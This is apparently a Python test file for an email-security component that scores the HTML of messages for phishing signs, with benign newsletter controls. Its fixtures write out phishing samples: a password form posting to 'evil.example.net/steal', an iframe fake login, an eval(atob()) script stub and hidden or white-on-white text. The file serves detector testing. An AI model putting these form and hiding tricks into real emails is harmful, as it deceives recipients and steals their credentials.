"""HTML structural analysis tests (WS3) — the 9 required adversarial scenarios."""
from guard.component import AnalysisContext
from guard.html import HtmlComponent
from tests.factories import make_email

SENDER = "news@company.com"


def _run(html, ctx=None, sender_domain="company.com"):
    parsed = make_email(from_addr=SENDER, body_html=html)
    return HtmlComponent().run(parsed, ctx or AnalysisContext())


def _newsletter_html():
    images = "".join(
        f'<img src="https://cdn.example.net/img{i}.png" alt="pic">' for i in range(12)
    )
    links = "".join(
        f'<a href="https://tracker.example.net/click?u={i}">Read more</a>' for i in range(8)
    )
    return (
        '<html><head><link rel="stylesheet" href="https://cdn.example.net/style.css"></head>'
        f"<body><h1>Monthly newsletter</h1>{images}{links}"
        "<p>Thanks for subscribing. Unsubscribe any time.</p></body></html>"
    )


def test_hidden_text_is_detected():
    html = '<html><body><div style="display:none">Verify your account password immediately</div></body></html>'
    result = _run(html)
    assert result.features["hidden_text_count"] >= 1
    assert result.features["obfuscation_score"] > 0.5
    assert any(e.feature == "hidden_text" for e in result.evidence)


def test_nested_html_complexity_is_not_malicious():
    inner = "<span>hello</span>"
    for _ in range(12):
        inner = f"<div><div>{inner}</div></div>"
    html = f"<html><body>{inner}</body></html>"
    result = _run(html)
    assert result.features["dom_depth"] > 5
    assert result.features["html_risk_score"] == 0.0


def test_harmless_newsletter_is_not_flagged():
    result = _run(_newsletter_html())
    assert result.features["html_risk_score"] == 0.0
    assert result.features["form_risk_score"] == 0.0
    assert result.features["obfuscation_score"] == 0.0
    # External resources are still reported as a feature, just not as risk.
    assert result.features["external_resource_count"] > 0


def test_html_credential_form():
    html = (
        '<html><body><form action="http://evil.example.net/steal">'
        '<input type="text" name="user"><input type="password" name="pass">'
        "</form></body></html>"
    )
    result = _run(html)
    assert result.features["credential_collection_indicator_count"] >= 1
    assert result.features["form_risk_score"] >= 0.85


def test_form_action_mismatch():
    html = (
        '<html><body><form action="https://other-domain.example/submit">'
        '<input type="text" name="x"></form></body></html>'
    )
    result = _run(html)
    assert result.features["form_submission_domain_mismatch"] == 1.0
    assert result.features["form_external_action_count"] >= 1


def test_encoded_scripts():
    blob = "A" * 120
    html = f'<html><body><script>eval(atob("{blob}"))</script></body></html>'
    result = _run(html)
    assert result.features["encoded_javascript_indicators"] >= 1
    assert result.features["suspicious_javascript_tokens"] >= 1


def test_iframe_credential_collection():
    html = (
        '<html><body><iframe src="http://evil.example.net/login"></iframe>'
        '<input type="password" name="p"></body></html>'
    )
    result = _run(html)
    assert result.features["iframe_count"] == 1
    assert result.features["iframe_credential_indicator"] == 1.0


def test_css_hiding_transparent_text():
    html = (
        '<html><body><span style="color:#ffffff;background-color:#ffffff">secret text</span>'
        "</body></html>"
    )
    result = _run(html)
    assert result.features["transparent_element_count"] >= 1
    assert result.features["obfuscation_score"] > 0.0


def test_benign_tracking_links():
    html = (
        '<html><body><p>News</p>'
        + "".join(f'<a href="https://t.example.net/c/{i}">link {i}</a>' for i in range(30))
        + '<img src="https://t.example.net/pixel.gif"></body></html>'
    )
    result = _run(html)
    assert result.features["html_risk_score"] == 0.0


def test_contextualization_raises_risk_for_untrusted_context():
    html = (
        '<html><body><form action="https://forms.example.org/submit">'
        '<input type="password" name="p"></form></body></html>'
    )
    low = _run(html, AnalysisContext())
    high = _run(html, AnalysisContext(sender_reputation=1.0, intent_scores={"credential_harvesting_score": 0.9}))
    assert high.features["html_risk_score"] > low.features["html_risk_score"]
